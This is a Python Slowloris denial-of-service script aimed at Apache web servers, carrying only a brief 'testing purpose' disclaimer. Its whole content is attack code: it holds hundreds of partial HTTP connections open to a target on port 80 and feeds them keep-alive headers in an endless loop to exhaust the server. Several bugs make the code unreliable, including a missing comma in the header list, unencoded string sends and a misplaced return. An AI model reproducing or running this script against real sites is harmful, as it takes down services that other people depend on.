#SlowLorris
# AN DOS Script FOR an Appache server
# this script is only for testing purpose please use it wisely

import socket
import random
import time
import sys

log_level = 2

def log (text, level=1):
    if log_level >= level:
        print(text)

list_of_sockets = []

regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/2010010}"
    "Accept-language: en-US,en,q=0.5"
]
def init_socket(ip): # creates an TCp connection with webserver
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((ip,80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 20000))) # creates an get request
    for header in regular_headers:
        s.send("{}\r\n".format(header).encode("utf-8"))
        return s

def main():
    if len(sys.argv) != 2:
        print("Usage: {} example.com".format(sys.argv[0]))
        return

    ip = sys.argv[1]
    socket_count = 210 # number of sockets we want to use
    log("Attacking {} with {} sockets." .format(ip, socket_count))

    log("Creating sockets...")

    for _ in range(socket_count):
        try:
            log("Creating socket nr {}".format(_), level=2)
            s = init_socket(ip)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        log("Sending Keep-alive headers .. Socket count :{}  ".format(socket_count))

        for s in list(list_of_sockets):
            try:
                s.send("X-a: {}\r\n".format(random.randint(1, 5000)))
            except socket.error:
                list_of_sockets.remove(s)
        for _ in range(socket_count - len(list_of_sockets)):
            log("Recreating socket ..")
            try:
                s = init_socket(ip)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
            time.sleep(10) 

if __name__ == "__main__":
    main()
